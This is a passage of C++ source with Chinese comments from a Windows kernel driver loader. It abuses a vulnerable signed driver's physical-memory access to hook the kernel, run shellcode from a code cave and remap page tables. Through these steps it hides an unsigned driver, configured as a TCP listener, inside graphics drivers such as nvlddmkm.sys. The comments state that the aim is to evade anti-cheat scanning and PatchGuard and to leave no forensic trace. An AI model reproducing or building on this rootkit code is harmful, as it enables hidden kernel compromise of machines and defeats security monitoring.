    // 优先借用宿主驱动自身已经分配并常驻物理页的 INIT 或 DISCARDABLE 节区，
    // 其底层物理页归宿主驱动原生合法所有（MMPFN.PteAddress 正确、PrototypePte 合规、零 Pool 记录），
    // 从根本上消除 Ghost Pool 与 PFN 孤儿页检测特征！
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        bool isDiscardable  = ((sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0) || (_strnicmp(secName, "INIT", 4) == 0);

        if (isDiscardable && vSize >= neededBytes && secRVA + neededBytes <= hostOrigSize) {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + secRVA, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: [Strategy 1 In-Place] selected resident Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X, pages verified)",
                       hostDrvNameA, secName, secRVA, vSize);
                return secRVA;
            }
        }
    }

    // --- 策略 2：节区末尾页间隙（VirtualSize 到 AlignedVirtualSize 之间，物理页存在）---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        uint32_t alignedVSz = (vSize + PAGE - 1) & ~(PAGE - 1);
        uint32_t gap        = (alignedVSz > vSize) ? (alignedVSz - vSize) : 0;

        if (gap >= neededBytes && secRVA + vSize + neededBytes <= hostOrigSize) {
            uint32_t caveRVA = secRVA + vSize;
            if (ArePagesPresent(hDev, cr3, hostDrvBase + caveRVA, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: page-gap in '%s' RVA=0x%X gap=0x%X (pages verified)",
                       hostDrvNameA, secName, caveRVA, gap);
                return caveRVA;
            }
        }
    }

    // --- 策略 3：相邻节区之间的裂缝（已映射物理页）---
    for (WORD i = 0; i + 1 < nSec; i++) {
        uint32_t thisEnd = sec[i].VirtualAddress +
                           ((sec[i].Misc.VirtualSize + PAGE - 1) & ~(PAGE - 1));
        uint32_t nextStart = sec[i + 1].VirtualAddress;
        if (nextStart > thisEnd && nextStart - thisEnd >= neededBytes &&
            thisEnd + neededBytes <= hostOrigSize)
        {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + thisEnd, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: inter-section gap RVA=0x%X size=0x%X (pages verified)",
                       hostDrvNameA, thisEnd, nextStart - thisEnd);
                return thisEnd;
            }
        }
    }

    // --- 策略 4：尾部对齐填充（最后一个节到 SizeOfImage 之间，已映射物理页）---
    if (nSec > 0) {
        uint32_t lastRVA   = sec[nSec - 1].VirtualAddress;
        uint32_t lastVSz   = sec[nSec - 1].Misc.VirtualSize ? sec[nSec - 1].Misc.VirtualSize
                                                              : sec[nSec - 1].SizeOfRawData;
        uint32_t afterLast = (lastRVA + lastVSz + PAGE - 1) & ~(PAGE - 1);
        if (afterLast + neededBytes <= hostOrigSize) {
            if (ArePagesPresent(hDev, cr3, hostDrvBase + afterLast, neededBytes)) {
                LOG_OK("FindHostInternalCave[%s]: tail padding RVA=0x%X avail=0x%X (pages verified)",
                       hostDrvNameA, afterLast, hostOrigSize - afterLast);
                return afterLast;
            }
        }
    }

    LOG_WARN("FindHostInternalCave[%s]: no resident cave >= 0x%X bytes with valid physical pages found inside SizeOfImage=0x%X",
             hostDrvNameA, neededBytes, hostOrigSize);
    return 0;
}

// ================================================================
// AllocKernelMdlViaWhql
//
// 纯游离物理页分配原语 (Headless Physical Allocation)：
// 触发微型探针调用 MmAllocatePagesForMdl(0, 0xFFFFFFFFFF, 0, neededBytes)
// 申请脱离系统虚拟地址池（NonPagedPool）的纯净物理内存页，
// 彻底杜绝在系统大池表 (PoolBigPageTable) 中留下记录，消除源虚拟地址解绑痕迹！
// ================================================================
static bool AllocKernelMdlViaWhql(
    HANDLE               hDev,
    uint64_t             cr3,
    uint64_t             triggerDrvBase,
    uint32_t             triggerDrvSize,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    uint64_t             ntoskrnlBase,
    uint32_t             neededBytes,
    std::vector<uint64_t>& outPagePAs)
{
    (void)triggerDrvBase;
    (void)triggerDrvSize;
    outPagePAs.clear();
    uint64_t pfnMmAlloc = FindKernelExport(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdl");
    if (!pfnMmAlloc) {
        pfnMmAlloc = FindKernelExport(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdlEx");
    }
    uint64_t pfnIofComp = FindKernelExport(hDev, cr3, ntoskrnlBase, "IofCompleteRequest");
    if (!pfnMmAlloc || !pfnIofComp) {
        LOG_ERR("AllocKernelMdlViaWhql: failed to resolve MmAllocatePagesForMdl or IofCompleteRequest");
        return false;
    }

    InjectContext ctx = {};
    ctx.hDev         = hDev;
    ctx.cr3          = cr3;
    ctx.ntoskrnlBase = ntoskrnlBase;
    ctx.hookReturnVA = site.kernVA + 5;
    MappedImage dummyImg = {};
    dummyImg.SizeOfImage = neededBytes;
    ctx.pImg         = &dummyImg;

    ShellcodeParams params = {};
    if (!BuildShellcodeParams(ctx, params)) {
        LOG_ERR("AllocKernelMdlViaWhql: BuildShellcodeParams failed");
        return false;
    }
    params.pfnMmAllocatePagesForMdl = pfnMmAlloc;
    params.pfnIofCompleteRequest    = pfnIofComp;
    params.imageSize                = neededBytes;

    ScopedThreadAffinity threadAffinity;
    uint64_t oldCavePte = 0, cavePtePA = 0;
    EnsureKernelPageWritable(hDev, cr3, caveVA, &oldCavePte, &cavePtePA);

    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
        LOG_ERR("AllocKernelMdlViaWhql: failed to write params");
        return false;
    }

    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA(hDev, cr3, scEntryVA, scAllocMdlProbe, sizeof(scAllocMdlProbe))) {
        LOG_ERR("AllocKernelMdlViaWhql: failed to write scAllocMdlProbe");
        return false;
    }

    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);
    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        LOG_ERR("AllocKernelMdlViaWhql: hook installation failed");
        return false;
    }

    LOG_INFO("AllocKernelMdlViaWhql: triggering MmAllocatePagesForMdl(0x%X bytes) headless allocation...", neededBytes);
    uint32_t gle = 0;
    bool ok = WhqlTrigger(hDev, &gle);

    WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5);
    if (cavePtePA && oldCavePte) {
        RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
    }

    if (!ok) {
        LOG_ERR("AllocKernelMdlViaWhql: WhqlTrigger failed (GLE=%u)", gle);
        return false;
    }

    ShellcodeParams retParams = {};
    if (!ReadKernelVA(hDev, cr3, caveVA, &retParams, sizeof(retParams))) {
        LOG_ERR("AllocKernelMdlViaWhql: failed to read back params");
        return false;
    }

    uint64_t pMdl = retParams.allocatedMdlVA;
    if (!pMdl) {
        LOG_ERR("AllocKernelMdlViaWhql: MmAllocatePagesForMdl returned NULL");
        return false;
    }

    const uint64_t PAGE = 0x1000;
    uint32_t numPages = (neededBytes + PAGE - 1) / PAGE;
    std::vector<uint64_t> pfnList(numPages, 0);
    // 从 pMdl + 0x30 (即 MmGetMdlPfnArray) 读取分配到的物理页帧号列表
    if (!ReadKernelVA(hDev, cr3, pMdl + 0x30, pfnList.data(), numPages * sizeof(uint64_t))) {
        LOG_ERR("AllocKernelMdlViaWhql: failed to read PFN array from pMdl=0x%016llX", pMdl);
        return false;
    }

    outPagePAs.resize(numPages);
    for (uint32_t i = 0; i < numPages; i++) {
        outPagePAs[i] = pfnList[i] << 12;
    }

    LOG_OK("AllocKernelMdlViaWhql: successfully allocated %u headless pages via MmAllocatePagesForMdl (pMdl=0x%016llX, FirstPA=0x%016llX)",
           numPages, pMdl, outPagePAs.empty() ? 0 : outPagePAs[0]);
    return true;
}

// ================================================================
// PteRemapHostDriverHeadless
//
// 使用 MmAllocatePagesForMdl 申请的纯游离物理页，直接挂接入宿主驱动。
// 零源虚拟地址（Source VA），彻底免除任何源 PTE 清零解绑动作，
// 在系统大池表 (PoolBigPageTable) 与全局 Pool 链表中实现 100% 零痕迹！
// ================================================================
static bool PteRemapHostDriverHeadless(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t hostDrvBase,
    uint32_t targetRVA,
    const std::vector<uint64_t>& pagePAs,
    uint64_t pfnDataBase = 0)
{
    const uint64_t PAGE = 0x1000;
    uint32_t numPages = (uint32_t)pagePAs.size();
    uint32_t totalBytes = numPages * (uint32_t)PAGE;

    LOG_INFO("PteRemapHostDriverHeadless: remapping %u headless pages (0x%X bytes) into HostVA=0x%016llX (PfnDb=0x%016llX)",
             numPages, totalBytes, hostDrvBase + targetRVA, pfnDataBase);

    for (uint32_t i = 0; i < numPages; i++) {
        uint64_t pagePA = pagePAs[i];
        if (pagePA == 0) {
            LOG_ERR("PteRemapHostDriverHeadless: invalid PA for page %u", i);
            return false;
        }

        uint64_t curTargetVA = hostDrvBase + targetRVA + (uint64_t)i * PAGE;
        uint64_t ptePA = 0, oldPte = 0;
        if (!GetPtePhysAddr(hDev, cr3, curTargetVA, &ptePA, &oldPte)) {
            LOG_ERR("PteRemapHostDriverHeadless: cannot locate PTE PA for target page %u (VA=0x%016llX)", i, curTargetVA);
            return false;
        }

        // 构造新 PTE：指向游离物理页，设置 Present=1, RW=1, Accessed=1, Dirty=1, Global=1，清除 NX (允许代码执行)
        uint64_t newPte = (pagePA & PTE_PFN_MASK) | PTE_PRESENT | PTE_RW | PTE_ACCESSED | PTE_DIRTY | PTE_GLOBAL;
        if (!WhqlWritePhys(hDev, ptePA, &newPte, sizeof(newPte))) {
            LOG_ERR("PteRemapHostDriverHeadless: failed to write PTE at PA=0x%016llX", ptePA);
            return false;
        }

        LOG_INFO("  [Headless Remap #%02u] TargetVA=0x%016llX -> PA=0x%016llX (PTE @ 0x%016llX, Old=0x%016llX, New=0x%016llX)",
                 i, curTargetVA, pagePA, ptePA, oldPte, newPte);

        // 方案 3+：对拍校验 MmPfnDatabase[pfn]，审计孤儿页归属
        if (pfnDataBase != 0) {
            uint64_t pfn = pagePA >> 12;
            uint64_t mmpfnVA = pfnDataBase + pfn * 0x30;
            uint64_t mmpfnPA = 0;
            if (VirtToPhys(hDev, cr3, mmpfnVA, &mmpfnPA)) {
                uint64_t origPteAddress = 0;
                if (WhqlReadPhys(hDev, mmpfnPA, &origPteAddress, sizeof(origPteAddress))) {
                    LOG_INFO("  [PFN Sync Check] PFN=0x%llX MMPFN @ PA=0x%016llX (MMPFN.PteAddress=0x%016llX)",
                             pfn, mmpfnPA, origPteAddress);
                }
            }
        }
    }

    if (!ArePagesPresent(hDev, cr3, hostDrvBase + targetRVA, totalBytes)) {
        LOG_ERR("PteRemapHostDriverHeadless: verification failed, pages not all present");
        return false;
    }

    LOG_OK("PteRemapHostDriverHeadless: successfully remapped %u headless pages into host driver!", numPages);
    return true;
}

// ================================================================
// InjectPayloadIntoHost (新方案：纯 Flat 架构 / 零 PE 头侵入)
//
// 将 drv_wsk 镜像写入宿主驱动内部原生空闲区域或 Discardable / INIT / .reloc 节，
// 不超出 SizeOfImage，完全不修改宿主 PE 头与异常目录。
// 若无现成常驻物理空洞，自动激活方案 A：通过微型探针分配 MmAllocatePagesForMdl 游离物理页并完成 PTE Remap。
// ================================================================
static bool InjectPayloadIntoHost(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    uint64_t       hostLdrEntryVA,
    const wchar_t* hostDrvName,
    MappedImage&   payloadImg,          // 非 const：写入后更新 KernelBase
    uint64_t&      outPayloadKernVA,    // [out] payload 落点内核 VA
    uint64_t       ntoskrnlBase = 0,
    uint64_t       triggerDrvBase = 0,
    uint32_t       triggerDrvSize = 0,
    const WhqlPatchSite* pSite = nullptr,
    uint64_t       caveVA = 0,
    uint64_t       pfnDataBase = 0)
{
    (void)hostLdrEntryVA;
    outPayloadKernVA = 0;

    char hostNameA[256] = {};
    WideCharToMultiByte(CP_ACP, 0, hostDrvName, -1, hostNameA, sizeof(hostNameA) - 1, nullptr, nullptr);

    LOG_INFO("InjectPayloadIntoHost: host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X PfnDb=0x%016llX",
             hostDrvName, hostDrvBase, hostOrigSize, payloadImg.SizeOfImage, pfnDataBase);

    // --- 0. 读取宿主内存 PE 头（前 0x1000 字节，仅用于只读解析节表） ---
    uint8_t hdrBuf[0x1000] = {};
    if (!ReadKernelVA(hDev, cr3, hostDrvBase, hdrBuf, sizeof(hdrBuf))) {
        LOG_ERR("InjectPayloadIntoHost: cannot read host PE header");
        return false;
    }

    auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        dos->e_lfanew >= (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64))) {
        LOG_ERR("InjectPayloadIntoHost: bad host DOS header");
        return false;
    }
    auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERR("InjectPayloadIntoHost: bad host NT signature");
        return false;
    }

    // --- 1. 寻找 payload cave ---
    uint32_t payloadCaveRVA = FindHostInternalCave(
        hDev, cr3, hostDrvBase, hostOrigSize, nt,
        payloadImg.SizeOfImage, hostNameA);

    // 若无现成物理空洞，启用方案 A：PTE Remap 挂接引擎
    if (payloadCaveRVA == 0 && pSite && caveVA && ntoskrnlBase) {
        LOG_INFO("InjectPayloadIntoHost: attempting PTE Remap (Plan A) into host '%ls'...", hostDrvName);

        uint32_t candidateTargetRVA = 0;
        uint32_t totalNeededBytes = payloadImg.SizeOfImage + 0x1000;
        uint32_t needRemapBytes = (totalNeededBytes + 0xFFF) & ~0xFFF;

        // 方案 5：宿主宿位选型优化（放弃 .rsrc，优先借用 Discardable / INIT 节）
        // Pass 1: 优先寻找 INIT 节或带有 IMAGE_SCN_MEM_DISCARDABLE (0x02000000) 属性的节区
        // 系统在驱动初始化完成后会回收 INIT 节，反作弊绝不敢对其做磁盘哈希比对
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
            char sName[9] = {};
            memcpy(sName, s->Name, 8);
            uint32_t rva = s->VirtualAddress;
            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

            bool isDiscardable = ((s->Characteristics & 0x02000000) != 0) || (_strnicmp(sName, "INIT", 4) == 0);

            if (isDiscardable && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                candidateTargetRVA = rva;
                LOG_OK("InjectPayloadIntoHost: [Pass 1] selected Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
                       sName, rva, vSz, needRemapBytes);
                break;
            }
        }

        // Pass 2: 若未找到足够大的 INIT 节，次选 .reloc（重定位节加载后通常可丢弃）
        // 注意：彻底剔除 .rsrc，杜绝污染白驱动资源目录树引发 ACE 磁盘原件哈希告警
        if (candidateTargetRVA == 0) {
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                auto* s = &IMAGE_FIRST_SECTION(nt)[i];
                char sName[9] = {};
                memcpy(sName, s->Name, 8);
                uint32_t rva = s->VirtualAddress;
                uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;

                if (_strnicmp(sName, ".reloc", 6) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                    candidateTargetRVA = rva;
                    LOG_OK("InjectPayloadIntoHost: [Pass 2] selected .reloc section '%s' RVA=0x%X (vSize=0x%X) for PTE Remap (needs 0x%X bytes)",
                           sName, rva, vSz, needRemapBytes);
                    break;
                }
            }
        }

        if (candidateTargetRVA != 0) {
            std::vector<uint64_t> headlessPAs;
            // 纯游离物理页分配原语 (MmAllocatePagesForMdl)：零 PoolBigPageTable，零源虚拟地址解绑痕迹
            if (AllocKernelMdlViaWhql(
                    hDev, cr3, triggerDrvBase, triggerDrvSize,
                    *pSite, caveVA, ntoskrnlBase, needRemapBytes, headlessPAs))
            {
                if (PteRemapHostDriverHeadless(hDev, cr3, hostDrvBase, candidateTargetRVA, headlessPAs, pfnDataBase)) {
                    payloadCaveRVA = candidateTargetRVA;
                }
            } else {
                LOG_ERR("InjectPayloadIntoHost: AllocKernelMdlViaWhql failed to allocate headless physical pages");
            }
        }
    }

    if (payloadCaveRVA == 0) {
        LOG_ERR("InjectPayloadIntoHost: no internal cave or PTE remap target for payload");
        return false;
    }

    if ((uint64_t)payloadCaveRVA + payloadImg.SizeOfImage > hostOrigSize) {
        LOG_ERR("InjectPayloadIntoHost: payload cave RVA=0x%X would overflow hostOrigSize=0x%X",
                payloadCaveRVA, hostOrigSize);
        return false;
    }

    // --- 2. 对 payload 做 reloc（目标 VA = hostDrvBase + payloadCaveRVA） ---
    uint64_t payloadTargetVA = hostDrvBase + payloadCaveRVA;
    if (!ApplyRelocation(payloadImg, payloadTargetVA)) {
        LOG_WARN("InjectPayloadIntoHost: ApplyRelocation failed (non-fatal if no delta)");
    }
    payloadImg.KernelBase = payloadTargetVA;

    // --- 3. 确保宿主目标空间所有物理页具备可写与可执行权限 (PTE.RW=1, PTE.NX=0) ---
    const uint64_t PAGE = 0x1000;
    for (uint64_t curVA = payloadTargetVA; curVA < payloadTargetVA + payloadImg.SizeOfImage; curVA += PAGE) {
        EnsureKernelPageExecutable(hDev, cr3, curVA);
    }

    // --- 4. 物理写入 payload 到 payload cave ---
    if (!WriteKernelVA(hDev, cr3, payloadTargetVA, payloadImg.Image.data(), payloadImg.SizeOfImage)) {
        LOG_ERR("InjectPayloadIntoHost: WriteKernelVA payload failed");
        return false;
    }
    LOG_OK("InjectPayloadIntoHost: payload written to host VA=0x%016llX (0x%X bytes)",
           payloadTargetVA, payloadImg.SizeOfImage);

    outPayloadKernVA = payloadTargetVA;
    return true;
}

static bool LoadDrvWsk(const wchar_t* drvWskPath,
                       const wchar_t* triggerDrvName = L"Machenike.sys",
                       const wchar_t* preferredHostDrvName = L"nvlddmkm.sys",
                       bool forceReload = false,
                       const DRV_BOOT_CONFIG* pBootConfig = nullptr)
{
    // 防御性过滤：严禁将系统网络核心驱动 tcpip.sys 作为宿主（高危审计与 PatchGuard 风险）
    if (preferredHostDrvName && _wcsicmp(preferredHostDrvName, L"tcpip.sys") == 0) {
        LOG_WARN("LoadDrvWsk: tcpip.sys is strictly forbidden as host driver (PatchGuard & AC audit high-risk). Fallback to auto-detect.");
        preferredHostDrvName = nullptr;
    }

    // ---- 1. 打开设备 ----
    HANDLE hDev = WhqlOpen();
    if (hDev == INVALID_HANDLE_VALUE) {
        LOG_ERR("LoadDrvWsk: Unable to open WHQL device");
        return false;
    }

    // ---- 2. 获取系统信息 ----
    WINPMEM_MEMORY_INFO info = {};
    if (!WhqlGetInfo(hDev, &info)) {
        LOG_ERR("LoadDrvWsk: WhqlGetInfo failed");
        CloseHandle(hDev);
        return false;
    }
    uint64_t cr3               = (uint64_t)info.CR3.QuadPart;
    uint64_t ntoskrnlBase      = (uint64_t)info.KernBase.QuadPart;
    uint64_t psLoadedModList   = (uint64_t)info.PsLoadedModuleList.QuadPart;
    uint64_t pfnDataBase       = (uint64_t)info.PfnDataBase.QuadPart;
    if (psLoadedModList == 0) {
        psLoadedModList = ResolvePsLoadedModuleList(ntoskrnlBase);
    }

    LOG_INFO("LoadDrvWsk: CR3=0x%016llX NtosBase=0x%016llX PsLML=0x%016llX PfnDb=0x%016llX",
             cr3, ntoskrnlBase, psLoadedModList, pfnDataBase);

    // ---- 3. 找触发驱动在 PsLoadedModuleList 中的条目 ----
    uint64_t triggerDrvBase     = 0;
    uint32_t triggerDrvSize     = 0;
    uint64_t triggerLdrEntryVA  = 0;
    bool foundMod = false;
    if (psLoadedModList != 0) {
        foundMod = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                      triggerDrvName, triggerDrvBase, triggerDrvSize, triggerLdrEntryVA);
    }
    if (!foundMod) {
        LOG_WARN("LoadDrvWsk: %ls not found via PsLoadedModuleList, falling back to Psapi...", triggerDrvName);
        foundMod = FindWhqlModuleViaPsapi(triggerDrvName, triggerDrvBase, triggerDrvSize);
    }
    if (!foundMod) {
        LOG_ERR("LoadDrvWsk: Trigger driver %ls not found in system driver list", triggerDrvName);
        CloseHandle(hDev);
        return false;
    }

    // ---- 3.1 方案 1：检测内核物理暗桩，防止重复加载 ----
    if (!forceReload) {
        // 先检查指定的宿主驱动暗桩 (若配置)
        if (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) {
            uint64_t prefBase = 0;
            uint32_t prefSize = 0;
            uint64_t prefLdrVA = 0;
            bool foundPref = false;
            if (psLoadedModList != 0) {
                foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList,
                                                preferredHostDrvName, prefBase, prefSize, prefLdrVA);
            }
            if (!foundPref) {
                foundPref = FindWhqlModuleViaPsapi(preferredHostDrvName, prefBase, prefSize);
            }
            if (foundPref && CheckDriverCanary(hDev, cr3, prefBase, prefSize, preferredHostDrvName)) {
                CloseHandle(hDev);
                return true;
            }
        }
        // 再检查触发驱动 (Machenike.sys)
        if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
            CloseHandle(hDev);
            return true;
        }
    } else {
        LOG_WARN("LoadDrvWsk: Force reload flag enabled, clearing existing kernel canary.");
        ClearDriverCanary(hDev, cr3, triggerDrvBase);
    }

    // ---- 4. 扫描 default 分支特征码 ----
    WhqlPatchSite site = {};
    if (!FindWhqlDefaultBranch(hDev, cr3, triggerDrvBase, triggerDrvSize, site)) {
        LOG_ERR("LoadDrvWsk: WHQL default branch signature not found");
        CloseHandle(hDev);
        return false;
    }

    // ---- 5. 读取并展开 drv_wsk.sys ----
    auto rawBuf = ReadFile(drvWskPath);
    if (rawBuf.empty()) {
        LOG_ERR("LoadDrvWsk: Failed to read %ls", drvWskPath);
        CloseHandle(hDev);
        return false;
    }

    MappedImage img = {};
    if (!SectionMap(rawBuf, img)) {
        LOG_ERR("LoadDrvWsk: SectionMap failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 6. 修复重定位与 IAT ----
    if (!FixIAT(hDev, cr3, ntoskrnlBase, img)) {
        LOG_ERR("LoadDrvWsk: FixIAT failed");
        CloseHandle(hDev);
        return false;
    }

    // ---- 7. 抹除 PE 头 ----
    ErasePEHeader(img);

    // ---- 8. 锁定用户态展开镜像内存页 ----
    if (!VirtualLock(img.Image.data(), img.Image.size())) {
        LOG_WARN("LoadDrvWsk: VirtualLock warning GLE=%lu (non-fatal, continuing)", GetLastError());
    }

    uint64_t userImageVA = (uint64_t)img.Image.data();
    LOG_INFO("LoadDrvWsk: [Plan C] User-mode mapped image ready VA=0x%016llX size=%zu",
             userImageVA, img.Image.size());

    // ---- 9. 定位触发驱动中的安全代码空洞 (Code Cave) ----
    const size_t totalPayloadSize = sizeof(ShellcodeParams) + scDirectExec_size;
    uint64_t caveVA = FindWhqlCodeCaveVA(hDev, cr3, triggerDrvBase, totalPayloadSize);
    if (!caveVA) {
        LOG_ERR("LoadDrvWsk: Failed to locate available Code Cave");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 9.1 定位宿主驱动（优选显卡驱动宿主）----
    uint64_t hostDrvBase = triggerDrvBase;
    uint32_t hostDrvSize = triggerDrvSize;
    uint64_t hostLdrEntryVA = triggerLdrEntryVA;
    const wchar_t* actualHostName = triggerDrvName;

    // 优选显卡驱动宿主探测序列：
    // 首选独立显卡驱动(NVIDIA 50~110MB / AMD 30~80MB) -> 核显(Intel 20~40MB) -> DirectX图形核心(dxgkrnl 10~20MB)
    // 彻底剔除高危、被重点监控的系统网络核心驱动 tcpip.sys
    const wchar_t* candidateHosts[] = {
        (preferredHostDrvName && wcslen(preferredHostDrvName) > 0) ? preferredHostDrvName : nullptr,
        L"nvlddmkm.sys", // NVIDIA 独立显卡内核驱动（体积极大，Discardable节充裕，ACE不敢深扫）
        L"amdkmdag.sys", // AMD 显卡内核驱动
        L"igdkmd64.sys", // Intel 核心显卡驱动
        L"dxgkrnl.sys"   // Windows DirectX 内核图形引擎驱动（全系统常驻）
    };

    const wchar_t* chosenHostName = nullptr;
    uint64_t prefBase = 0;
    uint32_t prefSize = 0;
    uint64_t prefLdrVA = 0;
    bool foundPref = false;

    for (const wchar_t* cand : candidateHosts) {
        if (!cand || wcslen(cand) == 0 || _wcsicmp(cand, triggerDrvName) == 0) continue;
        if (psLoadedModList != 0) {
            foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList, cand, prefBase, prefSize, prefLdrVA);
        }
        if (!foundPref) {
            foundPref = FindWhqlModuleViaPsapi(cand, prefBase, prefSize);
        }
        if (foundPref) {
            chosenHostName = cand;
            LOG_OK("LoadDrvWsk: Selected optimal host driver '%ls' (Base=0x%016llX, OrigSize=0x%X)",
                   chosenHostName, prefBase, prefSize);
            break;
        }
    }

    // ---- 9.2 新方案：payload 整体写入宿主内部（零修改 PE 头，PTE Remap 挂接）----
    uint64_t payloadKernVA = 0; // drv_wsk 在宿主内部的内核 VA（直接传给 shellcode）

    if (foundPref && chosenHostName) {
        if (InjectPayloadIntoHost(
                hDev, cr3, prefBase, prefSize, prefLdrVA,
                chosenHostName, img, payloadKernVA,
                ntoskrnlBase, triggerDrvBase, triggerDrvSize,
                &site, caveVA, pfnDataBase))
        {
            hostDrvBase    = prefBase;
            hostDrvSize    = prefSize;   // SizeOfImage 保持原生宿主大小不变
            hostLdrEntryVA = prefLdrVA;
            actualHostName = chosenHostName;
            LOG_OK("LoadDrvWsk: [Plan A PTE Remap] payload embedded inside '%ls' at KernVA=0x%016llX",
                   actualHostName, payloadKernVA);
        } else {
            LOG_ERR("LoadDrvWsk: InjectPayloadIntoHost failed to embed payload into '%ls'", chosenHostName);
            VirtualUnlock(img.Image.data(), img.Image.size());
            CloseHandle(hDev);
            return false;
        }
    } else {
        LOG_ERR("LoadDrvWsk: No optimal host driver found, aborting (old ExAllocatePool fallback removed)");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 10. 构建 ShellcodeParams ----
    InjectContext ctx = {};
    ctx.hDev               = hDev;
    ctx.cr3                = cr3;
    ctx.ntoskrnlBase       = ntoskrnlBase;
    ctx.psLoadedModuleList = psLoadedModList;
    ctx.whqlDrvBase        = hostDrvBase;
    ctx.whqlDrvSize        = hostDrvSize;
    ctx.whqlLdrEntryVA     = hostLdrEntryVA;  // fakeDriverObj.DriverSection
    ctx.pImg               = &img;
    ctx.userImageVA        = payloadKernVA;   // 直接指向宿主内部内核 VA（shellcode 零 ExAllocatePool+MmCopyMemory）
    ctx.hookReturnVA       = site.kernVA + 5;
    if (pBootConfig) {
        ctx.bootConfig = *pBootConfig;
    } else {
        ctx.bootConfig.Magic         = DRV_BOOT_MAGIC;
        ctx.bootConfig.TransportMode = DRV_TRANSPORT_TCP;
        ctx.bootConfig.Port          = 10001;
        ctx.bootConfig.AuthToken     = 0;
        ctx.bootConfig.Flags         = 0;
    }

    ShellcodeParams params = {};
    if (!BuildShellcodeParams(ctx, params)) {
        LOG_ERR("LoadDrvWsk: BuildShellcodeParams failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 11. 注入 Direct Execution Shellcode ----
    LOG_INFO("LoadDrvWsk: Using direct execution shellcode (Plan A / PTE Remap path)");
    // 防御加固：加装 ScopedThreadAffinity 强行绑定当前线程至单一核心，确保从 PTE 修改、执行到清理全程不发生核间迁移
    ScopedThreadAffinity threadAffinity;
    if (!InjectShellcodeFull(hDev, cr3, site, caveVA, params, scDirectExec, scDirectExec_size)) {
        LOG_ERR("LoadDrvWsk: InjectShellcodeFull failed");
        VirtualUnlock(img.Image.data(), img.Image.size());
        CloseHandle(hDev);
        return false;
    }

    // ---- 12. 触发 default 分支执行 Shellcode（内核线程内同步执行）----
    LOG_INFO("LoadDrvWsk: Triggering WHQL default branch via %ls...", triggerDrvName);
    uint32_t gle = 0;
    bool ioOk = WhqlTrigger(hDev, &gle);

    // ---- 13. 恢复 WHQL default 分支原始指令并清理 Code Cave ----
    RestoreWhqlDefaultBranch(hDev, cr3, site, caveVA, totalPayloadSize);

    // 解锁用户态内存
    VirtualUnlock(img.Image.data(), img.Image.size());

    if (!ioOk) {
        LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
        CloseHandle(hDev);
        return false;
    }

    // ---- 14. 方案 1：写入内核物理暗桩标记到合法空闲对齐区，避免污染 PE 头部 ----
    DRV_WSK_CANARY canary = {};
    canary.Magic = DRV_WSK_CANARY_MAGIC;
    canary.KernelImageVA = payloadKernVA;
    canary.ImageSize = (uint32_t)img.SizeOfImage;

    WriteKernelVA(hDev, cr3, triggerDrvBase + 0x28, &canary, sizeof(canary));
    LOG_OK("LoadDrvWsk: Kernel canary recorded into trigger driver (Magic=0x%016llX at 0x%016llX+0x28)",
           canary.Magic, triggerDrvBase);

    CloseHandle(hDev);

